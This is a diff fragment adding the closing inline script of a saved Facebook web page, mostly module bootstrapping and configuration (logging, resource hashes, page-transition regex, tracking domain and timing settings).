+                        ],
+                        ["TimeSliceImpl", "setLogging", [],
+                            [false, 0.01]
+                        ],
+                        ["NavigationClickPointHandler"],
+                        ["WebStorageMonster", "schedule", [],
+                            [true]
+                        ],
+                        ["Artillery", "disable", [],
+                            []
+                        ],
+                        ["ArtilleryOnUntilOffLogging", "disable", [],
+                            []
+                        ],
+                        ["ArtilleryRequestDataCollection", "disable", [],
+                            ["6786054741145932560-0"]
+                        ],
+                        ["ScriptPathLogger", "startLogging", [],
+                            []
+                        ],
+                        ["TimeSpentBitArrayLogger", "init", [],
+                            []
+                        ],
+                        ["ArtilleryRequestDataCollection", "init", [],
+                            []
+                        ]
+                    ],
+                    define: [
+                        ["cr:838016", ["React-prod"], {
+                            __rc: ["React-prod", "Aa3SAU3d7D6myBGheXhZKFifiz6aI_QOlB8Qe_jJN97PxdHGxkjMvAwWWKA-ezDzxqf-FlGUZu5xBg"]
+                        }, -1],
+                        ["cr:891836", ["ReactDOMProdOrProfiling-fb"], {
+                            __rc: ["ReactDOMProdOrProfiling-fb", "Aa3SAU3d7D6myBGheXhZKFifiz6aI_QOlB8Qe_jJN97PxdHGxkjMvAwWWKA-ezDzxqf-FlGUZu5xBg"]
+                        }, -1],
+                        ["cr:917439", ["PageTransitionsBlue"], {
+                            __rc: ["PageTransitionsBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:1108857", [], {
+                            __rc: [null, "Aa3SAU3d7D6myBGheXhZKFifiz6aI_QOlB8Qe_jJN97PxdHGxkjMvAwWWKA-ezDzxqf-FlGUZu5xBg"]
+                        }, -1],
+                        ["cr:1069930", [], {
+                            __rc: [null, "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:1083116", ["XAsyncRequest"], {
+                            __rc: ["XAsyncRequest", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:1083117", [], {
+                            __rc: [null, "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:1109759", ["CookieConsentBlacklist"], {
+                            __rc: ["CookieConsentBlacklist", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:682514", ["ReactDOM-prod"], {
+                            __rc: ["ReactDOM-prod", "Aa3JgaMUFV5bKoHiCLjPMxnjAbXOkB4MU7Zf_DLjBO0upVHAZzcC9xLSlxssev-UlS5-dj3pkeMO_ZLUycO7la8Cj1-EQQ"]
+                        }, -1],
+                        ["cr:895839", ["ReactFiberErrorDialogImpl"], {
+                            __rc: ["ReactFiberErrorDialogImpl", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:895840", [], {
+                            __rc: [null, "Aa2xFdUr9a7_V-QlH_SGvNGDm3nllOSy_iyKAxoTvdEnnbD30xMldfgj0UM-yZznTWNljOdqrbqtM-vH2CL8wWxoQzg"]
+                        }, -1],
+                        ["cr:888908", ["warningBlue"], {
+                            __rc: ["warningBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:971473", ["LayerHideOnTransition"], {
+                            __rc: ["LayerHideOnTransition", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:1105154", [], {
+                            __rc: [null, "Aa3SAU3d7D6myBGheXhZKFifiz6aI_QOlB8Qe_jJN97PxdHGxkjMvAwWWKA-ezDzxqf-FlGUZu5xBg"]
+                        }, -1],
+                        ["cr:983844", [], {
+                            __rc: [null, "Aa3SAU3d7D6myBGheXhZKFifiz6aI_QOlB8Qe_jJN97PxdHGxkjMvAwWWKA-ezDzxqf-FlGUZu5xBg"]
+                        }, -1],
+                        ["PageTransitionsConfig", [], {
+                            reloadOnBootloadError: true
+                        }, 1067],
+                        ["CoreWarningGK", [], {
+                            forceWarning: false
+                        }, 725],
+                        ["cr:844180", ["TimeSpentImmediateActiveSecondsLoggerBlue"], {
+                            __rc: ["TimeSpentImmediateActiveSecondsLoggerBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["cr:1187159", ["BlueCompatBroker"], {
+                            __rc: ["BlueCompatBroker", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                        }, -1],
+                        ["KillabyteProfilerConfig", [], {
+                            htmlProfilerModule: null,
+                            profilerModule: null,
+                            depTypes: {
+                                BL: "bl",
+                                NON_BL: "non-bl"
+                            }
+                        }, 1145],
+                        ["QuicklingConfig", [], {
+                            version: "1001641474;0;",
+                            sessionLength: 30,
+                            inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
+                            badRequestKeys: ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"],
+                            logRefreshOverhead: false
+                        }, 60],
+                        ["TrackingConfig", [], {
+                            domain: "https://pixel.facebook.com"
+                        }, 325],
+                        ["JSErrorLoggingConfig", [], {
+                            extra: ["policy:www:no_min_nl"],
+                            reportInterval: 50
+                        }, 2776],
+                        ["WebStorageMonsterLoggingURI", [], {
+                            uri: "/ajax/webstorage/process_keys/?state=1"
+                        }, 3032],
+                        ["BrowserPaymentHandlerConfig", [], {
+                            enabled: false
+                        }, 3904],
+                        ["TimeSpentConfig", [], {
+                            "0_delay": 0,
+                            "0_timeout": 8,
+                            delay: 1000,
+                            timeout: 64
+                        }, 142],
+                        ["ImmediateActiveSecondsConfig", [], {
+                            sampling_rate: 0
+                        }, 423]
+                    ]
+                },
+                last_in_phase: true,
+                the_end: true
+            });
+        }), "onPageletArrive last_response", {
+            "root": true,
+            "pagelet": "last_response"
+        })();
+    </script>
+</body>
+
+</html>
